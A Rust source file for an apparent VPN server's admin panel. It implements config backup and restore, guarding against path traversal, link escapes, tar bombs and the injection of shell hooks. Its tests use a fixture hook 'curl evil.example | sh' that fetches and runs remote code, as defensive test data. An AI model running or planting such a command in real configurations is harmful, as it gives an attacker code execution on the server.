use crate::server::web::auth::{self, AuthError};
use axum::body::{Body, Bytes};
use axum::http::{header, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde_json::{json, Value};
use std::time::{SystemTime, UNIX_EPOCH};

/// Stream a gzip tarball of `/etc/qeli` (config + users file + identity keys) for
/// off-box backup. Authed-admin only; a GET so the browser downloads it straight
/// to disk carrying the session cookie. Restore = extract it back into `/etc`
/// (`tar xzf qeli-backup-*.tar.gz -C /etc`) and restart.
pub async fn download_backup(_guard: auth::AuthGuard) -> Result<Response, AuthError> {
    let out = tokio::task::spawn_blocking(|| {
        // `--ignore-failed-read`: the panel runs as the `qeli` user and some items
        // under /etc/qeli (e.g. root-owned client-links/, mode 0700) are unreadable
        // to it — skip those rather than abort, so the restore-critical files
        // (server config, users, identity keys) still get backed up.
        // `--xattrs`: preserve extended attributes so a restore keeps them.
        std::process::Command::new("tar")
            .args([
                "czf",
                "-",
                "--ignore-failed-read",
                "--xattrs",
                // Don't fold prior restore snapshots into a new backup — each restore leaves
                // up to 5, so re-downloading would balloon the archive and a re-upload could
                // exceed the 16 MiB restore limit (413).
                "--exclude=qeli/.pre-restore-*.tgz",
                "--exclude=qeli/.restore-upload.tgz",
                "-C",
                "/etc",
                "qeli",
            ])
            .output()
    })
    .await;

    // tar exits non-zero (1/2) when it skipped unreadable files, yet still produces
    // a valid archive — accept any non-empty gzip stream (magic 1f 8b).
    let is_gzip = |b: &[u8]| b.len() > 2 && b[0] == 0x1f && b[1] == 0x8b;
    let o = match out {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("tar spawn error: {e}"),
            )
                .into_response())
        }
        Err(e) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("task error: {e}"),
            )
                .into_response())
        }
    };
    if !is_gzip(&o.stdout) {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("tar failed: {}", String::from_utf8_lossy(&o.stderr)),
        )
            .into_response());
    }
    // `--ignore-failed-read` silently drops files the qeli user can't read. That is
    // fine for the root-owned client-links/, but if it drops the IDENTITY KEYS
    // (root-owned 0600) the archive looks successful yet restores a server with a
    // DIFFERENT identity — every client would need re-pinning. tar names any file it
    // skipped on stderr (success is silent), so a mention of qeli/identity means the
    // keys are missing: refuse rather than hand out a broken backup.
    let stderr = String::from_utf8_lossy(&o.stderr);
    if stderr.contains("qeli/identity") {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!(
                "backup aborted: the server identity key(s) under /etc/qeli/identity were \
                 unreadable and would be MISSING from the archive (a restore would change the \
                 server identity and break every pinned client). Fix the permissions \
                 (`chown -R qeli:qeli /etc/qeli/identity`) or take the backup as root. \
                 tar: {}",
                stderr.trim()
            ),
        )
            .into_response());
    }
    let bytes = o.stdout;

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let fname = format!("qeli-backup-{ts}.tar.gz");
    let mut resp = Response::new(Body::from(bytes));
    let h = resp.headers_mut();
    h.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/gzip"),
    );
    if let Ok(v) = HeaderValue::from_str(&format!("attachment; filename=\"{fname}\"")) {
        h.insert(header::CONTENT_DISPOSITION, v);
    }
    Ok(resp)
}

/// Restore `/etc/qeli` from an uploaded backup `.tar.gz` (the file produced by
/// `download_backup`). The body is the raw gzip. Before extracting it validates
/// the archive is a gzip whose entries ALL live under `qeli/` (no absolute paths
/// or `..` traversal), then snapshots the current directory to a pre-restore
/// archive so the change is reversible. The worker must be restarted to apply.
pub async fn restore_backup(
    _guard: auth::AuthGuard,
    body: Bytes,
) -> Result<Json<Value>, AuthError> {
    let result = tokio::task::spawn_blocking(move || restore_blocking(&body)).await;
    Ok(Json(match result {
        Ok(Ok(msg)) => {
            // Notify (Tier-3): a successful restore changed /etc/qeli on disk.
            tokio::spawn(async {
                crate::server::notify::fire(
                    crate::server::notify::Event::Restore,
                    "config restored from an uploaded backup",
                )
                .await;
            });
            json!({ "ok": true, "message": msg })
        }
        Ok(Err(e)) => json!({ "ok": false, "error": e }),
        Err(e) => json!({ "ok": false, "error": format!("task error: {e}") }),
    }))
}

fn restore_blocking(data: &[u8]) -> Result<String, String> {
    if data.len() < 3 || data[0] != 0x1f || data[1] != 0x8b {
        return Err("not a gzip archive".into());
    }
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // Per-restore name. A single fixed path meant two concurrent restores wrote the same
    // file, so one could list its own archive and extract the other's.
    let tmp = &format!("/etc/qeli/.restore-upload-{ts}-{}.tgz", std::process::id());
    std::fs::write(tmp, data).map_err(|e| format!("write temp file: {e}"))?;
    let cleanup = || {
        let _ = std::fs::remove_file(tmp);
    };

    // List entries and refuse anything not safely contained under `qeli/`.
    let listing = match std::process::Command::new("tar")
        .args(["tzvf", tmp])
        .output()
    {
        Ok(o) if o.status.success() => o.stdout,
        Ok(o) => {
            cleanup();
            return Err(format!(
                "not a valid tar.gz: {}",
                String::from_utf8_lossy(&o.stderr)
            ));
        }
        Err(e) => {
            cleanup();
            return Err(format!("tar list failed: {e}"));
        }
    };
    // Bound the EXPANDED archive, not just the 16 MiB upload. gzip reaches ~1000:1 on
    // repetitive data, so a compliant 16 MiB upload can expand to ~16 GB written into
    // /etc — a tar bomb that fills the root filesystem (and takes the server with it).
    // The real backup is config + users + keys: kilobytes to a few MB.
    const MAX_RESTORE_BYTES: u64 = 64 * 1024 * 1024;
    const MAX_RESTORE_ENTRIES: usize = 5_000;
    let mut total_bytes = 0u64;
    let mut count = 0usize;
    for line in String::from_utf8_lossy(&listing).lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        // `tar tzvf` fields: perms, owner/group, SIZE, date, time, name… (the name
        // parser below skips the same 5).
        if let Some(sz) = line
            .split_whitespace()
            .nth(2)
            .and_then(|s| s.parse::<u64>().ok())
        {
            total_bytes = total_bytes.saturating_add(sz);
            if total_bytes > MAX_RESTORE_BYTES {
                cleanup();
                return Err(format!(
                    "refused: archive expands to more than {} MiB — a qeli backup is far \
                     smaller, so this looks like a decompression bomb",
                    MAX_RESTORE_BYTES / (1024 * 1024)
                ));
            }
        }
        // `tar tzvf` prefixes each entry with its type flag. Refuse anything that is
        // not a regular file ('-') or directory ('d'): a symlink / hardlink / device
        // entry is a classic tar-extraction escape (write THROUGH a link pointing
        // outside qeli/), which the path check below cannot stop on its own.
        let ftype = line.chars().next().unwrap_or(' ');
        if ftype != '-' && ftype != 'd' {
            cleanup();
            return Err(
                "refused: archive contains a symlink/hardlink/special entry \
                 (only regular files and directories are allowed)"
                    .into(),
            );
        }
        // The entry name is field 6+ of `tar tzvf` (perms, owner/group, size, date,
        // time, name…). Take the WHOLE name, not just the last whitespace token — a
        // crafted name containing a space (e.g. `x/../evil qeli/z`) would otherwise parse
        // as the benign `qeli/z` and slip past the `..` / prefix checks. (No `-> target`
        // suffix to worry about — symlinks are already rejected above.)
        let name = line
            .split_whitespace()
            .skip(5)
            .collect::<Vec<_>>()
            .join(" ");
        let p = name.as_str();
        if p.is_empty()
            || p.starts_with('/')
            || p.contains("..")
            || !(p == "qeli" || p.starts_with("qeli/"))
        {
            cleanup();
            return Err(format!(
                "refused: archive contains an unexpected path '{p}' (entries must be under qeli/)"
            ));
        }
        count += 1;
        if count > MAX_RESTORE_ENTRIES {
            cleanup();
            return Err(format!(
                "refused: archive contains more than {MAX_RESTORE_ENTRIES} entries — a qeli \
                 backup holds a handful of config files"
            ));
        }
    }
    if count == 0 {
        cleanup();
        return Err("archive is empty".into());
    }

    // Snapshot the current state so a bad restore is reversible. If this fails there is
    // no way back, so refuse the restore rather than proceed unprotected — the whole
    // point of the snapshot is that the operator can undo a bad archive.
    let bak = format!("/etc/qeli/.pre-restore-{ts}.tgz");
    match std::process::Command::new("tar")
        .args([
            "czf",
            &bak,
            "--ignore-failed-read",
            "--xattrs",
            "-C",
            "/etc",
            "qeli",
        ])
        .output()
    {
        Ok(o) if o.status.success() => {}
        Ok(o) => {
            cleanup();
            return Err(format!(
                "refusing to restore: could not take the pre-restore snapshot ({}) — without \
                 it the change would be irreversible",
                String::from_utf8_lossy(&o.stderr).trim()
            ));
        }
        Err(e) => {
            cleanup();
            return Err(format!(
                "refusing to restore: could not run tar for the pre-restore snapshot ({e})"
            ));
        }
    }
    // The snapshot holds identity keys + user hashes — keep it admin-only, and
    // rotate old ones so repeated restores don't grow /etc/qeli without bound.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&bak, std::fs::Permissions::from_mode(0o600));
    }
    prune_pre_restore_snapshots(5);

    // Extract into a STAGING directory, never straight into /etc/qeli. The checks above
    // are structural (paths, links, bomb) and say nothing about CONTENT — and content is
    // the dangerous part: `routing.post_up` is run through `/bin/sh -c` at profile start
    // (see hooks.rs), so extracting an attacker's config in place turned an authenticated
    // panel session into command execution on the next restart. It also bypassed the
    // deliberate rule that `PUT /config` enforces — hooks are file-only, the panel may
    // never set them. Staging lets us apply that same rule to a restore before anything
    // reaches the live directory.
    let staging = format!("/etc/qeli/.restore-staging-{ts}");
    let _ = std::fs::remove_dir_all(&staging);
    if let Err(e) = std::fs::create_dir(&staging) {
        cleanup();
        return Err(format!("cannot create the staging directory: {e}"));
    }
    let stage_cleanup = || {
        let _ = std::fs::remove_dir_all(&staging);
    };
    let ex = std::process::Command::new("tar")
        .args(["xzf", tmp, "--xattrs", "-C", &staging])
        .output();
    cleanup();
    match ex {
        Ok(o) if o.status.success() => {}
        Ok(o) => {
            stage_cleanup();
            return Err(format!(
                "extract failed: {}",
                String::from_utf8_lossy(&o.stderr)
            ));
        }
        Err(e) => {
            stage_cleanup();
            return Err(format!("tar extract spawn failed: {e}"));
        }
    }

    let staged_root = format!("{staging}/qeli");
    if let Err(e) = vet_staged_tree(&staged_root) {
        stage_cleanup();
        return Err(e);
    }

    // Vetted — publish. Same filesystem, so each rename is atomic; a failure part-way
    // leaves the rest of the live directory intact and the pre-restore snapshot above
    // restores the whole thing.
    if let Err(e) = publish_staged_tree(&staged_root, "/etc/qeli") {
        stage_cleanup();
        return Err(format!("publishing the restored files failed: {e}"));
    }
    stage_cleanup();
    Ok(format!(
        "restored {count} file(s) into /etc/qeli (pre-restore backup saved to {bak}). \
         Restart the server to apply."
    ))
}

/// Reject a staged tree whose CONTENT would be unsafe to publish.
///
/// Two rules, both mirroring controls that already exist elsewhere:
///  * hooks are file-only — a restored config may not introduce or change
///    `post_up`/`post_down` (server) or `password_command` (client profile) relative to
///    what is live today. This is exactly what `PUT /config` enforces; restore was the
///    one panel path that skipped it, and it is the link that made the chain RCE.
///  * a restored server config must still pass `validate_profiles`, so a restore cannot
///    leave the worker crash-looping on a config the panel happily accepted.
///
/// Known residual, deliberately not papered over: if an operator's hook invokes a script
/// that itself lives under /etc/qeli, a restore can still replace that script's contents
/// without touching the config. Hooks should point outside the panel-writable directory.
fn vet_staged_tree(root: &str) -> Result<(), String> {
    let entries = std::fs::read_dir(root).map_err(|e| format!("staged tree unreadable: {e}"))?;
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        let md = match entry.metadata() {
            Ok(m) => m,
            Err(e) => return Err(format!("cannot stat staged '{name}': {e}")),
        };
        if md.is_dir() {
            // identity/ and friends: recurse, same rules.
            vet_staged_tree(&path.to_string_lossy())?;
            continue;
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if md.permissions().mode() & 0o111 != 0 {
                return Err(format!(
                    "refused: '{name}' is executable — a qeli backup holds configs and keys, \
                     never programs"
                ));
            }
        }
        if !name.ends_with(".conf") {
            continue; // keys, usage.json, … carry no executable semantics
        }
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) => return Err(format!("cannot read staged '{name}': {e}")),
        };
        let live = std::fs::read_to_string(format!("/etc/qeli/{name}")).unwrap_or_default();
        vet_config_file(&name, &text, &live)?;
    }
    Ok(())
}

/// Apply the hook/validation rules to one staged `.conf`, given the file it would
/// replace (empty when it is a new file).
fn vet_config_file(name: &str, staged: &str, live: &str) -> Result<(), String> {
    // Server config: profiles present. Compare hooks per profile against the live file.
    if let Ok(cfg) = crate::config::parse_server_config(staged) {
        if !cfg.profiles.is_empty() {
            let live_cfg = crate::config::parse_server_config(live).ok();
            for p in &cfg.profiles {
                if p.routing.post_up.is_empty() && p.routing.post_down.is_empty() {
                    continue;
                }
                let unchanged = live_cfg
                    .as_ref()
                    .and_then(|l| l.profiles.iter().find(|lp| lp.name == p.name))
                    .is_some_and(|lp| {
                        lp.routing.post_up == p.routing.post_up
                            && lp.routing.post_down == p.routing.post_down
                    });
                if !unchanged {
                    return Err(format!(
                        "refused: '{name}' profile '{}' sets routing.post_up/post_down, which \
                         run through a shell on the server. Hooks are file-only — they cannot \
                         be introduced or changed through the panel (the same rule the config \
                         editor enforces). Edit the file on the server if you mean to change them.",
                        p.name
                    ));
                }
            }
            // A restore must not be able to wedge the worker either.
            crate::server::validate_profiles(&cfg)
                .map_err(|e| format!("refused: '{name}' would not start: {e}"))?;
            return Ok(());
        }
    }
    // Otherwise treat it as a client profile.
    if let Ok(c) = crate::config::parse_client_config(staged) {
        let live_c = crate::config::parse_client_config(live).ok();
        let staged_hooks = (
            c.auth.password_command.clone().unwrap_or_default(),
            c.routing.post_up.clone(),
            c.routing.post_down.clone(),
        );
        if !staged_hooks.0.is_empty() || !staged_hooks.1.is_empty() || !staged_hooks.2.is_empty() {
            let unchanged = live_c.is_some_and(|l| {
                l.auth.password_command.unwrap_or_default() == staged_hooks.0
                    && l.routing.post_up == staged_hooks.1
                    && l.routing.post_down == staged_hooks.2
            });
            if !unchanged {
                return Err(format!(
                    "refused: client profile '{name}' sets password_command/post_up/post_down, \
                     which execute commands on whoever imports it. These cannot be introduced \
                     through the panel."
                ));
            }
        }
    }
    Ok(())
}

/// Move every staged file into `dest`, creating directories as needed. Same
/// filesystem, so each `rename` is atomic.
fn publish_staged_tree(root: &str, dest: &str) -> std::io::Result<()> {
    std::fs::create_dir_all(dest)?;
    for entry in std::fs::read_dir(root)?.flatten() {
        let from = entry.path();
        let to = format!("{dest}/{}", entry.file_name().to_string_lossy());
        if entry.metadata()?.is_dir() {
            publish_staged_tree(&from.to_string_lossy(), &to)?;
        } else {
            std::fs::rename(&from, &to)?;
        }
    }
    Ok(())
}

/// Keep only the `keep` newest `.pre-restore-*.tgz` snapshots in /etc/qeli so
/// repeated restores don't grow the config dir without bound. The timestamp is
/// embedded in the name (unix seconds), so lexicographic sort == chronological.
fn prune_pre_restore_snapshots(keep: usize) {
    let mut snaps: Vec<std::path::PathBuf> = match std::fs::read_dir("/etc/qeli") {
        Ok(rd) => rd
            .filter_map(|e| e.ok().map(|e| e.path()))
            .filter(|p| {
                p.file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| n.starts_with(".pre-restore-") && n.ends_with(".tgz"))
                    .unwrap_or(false)
            })
            .collect(),
        Err(_) => return,
    };
    if snaps.len() <= keep {
        return;
    }
    snaps.sort();
    let remove_n = snaps.len() - keep;
    for p in snaps.into_iter().take(remove_n) {
        let _ = std::fs::remove_file(p);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal server config; `hooks` is spliced into the profile verbatim.
    fn srv(hooks: &str) -> String {
        format!(
            "[profile:p]\n\
             bind.address = 0.0.0.0\n\
             bind.port = 443\n\
             bind.transport = tcp\n\
             tun.name = vpn0\n\
             tun.address = 10.0.0.1\n\
             tun.netmask = 255.255.255.0\n\
             pool.cidr = 10.0.0.0/24\n\
             obf.mode = fake-tls\n\
             perf.connection.max_clients = 8\n\
             perf.connection.handshake_timeout_secs = 10\n\
             {hooks}"
        )
    }

    #[test]
    fn restore_cannot_introduce_a_server_hook() {
        // The link that made the chain RCE: an uploaded backup carrying a post_up that
        // the live config does not have. `/bin/sh -c` runs it at the next profile start.
        let staged = srv("routing.post_up = curl evil.example | sh\n");
        let live = srv("");
        let err = vet_config_file("server.conf", &staged, &live).unwrap_err();
        assert!(
            err.contains("post_up"),
            "a newly introduced hook must be refused, got: {err}"
        );
    }

    #[test]
    fn restore_keeps_working_on_a_server_that_legitimately_uses_hooks() {
        // The rule is "unchanged", not "empty" — otherwise restoring a backup taken on a
        // server whose operator set hooks in the file would always fail.
        let same = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &same, &same).is_ok());
    }

    #[test]
    fn restore_cannot_change_an_existing_server_hook() {
        let staged = srv("routing.post_up = /opt/site/evil.sh\n");
        let live = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &staged, &live).is_err());
    }

    #[test]
    fn restore_cannot_wedge_the_worker_with_a_bad_address() {
        // A config the panel would accept but the worker dies on — the crash-loop the
        // stricter validate_profiles now catches, reused here so a restore can't do it.
        let staged = srv("").replace("pool.cidr = 10.0.0.0/24", "pool.cidr = 10.0.0.0/33");
        let err = vet_config_file("server.conf", &staged, &srv("")).unwrap_err();
        assert!(
            err.contains("would not start"),
            "expected the validation gate to fire, got: {err}"
        );
    }

    #[test]
    fn restore_cannot_introduce_a_client_password_command() {
        // Executes on whoever imports the profile, so the same rule applies.
        let staged = "[qeli]\nserver = h:443\nuser = a\npassword_command = /bin/evil\n";
        let live = "[qeli]\nserver = h:443\nuser = a\n";
        assert!(vet_config_file("client-a.conf", staged, live).is_err());
    }
}
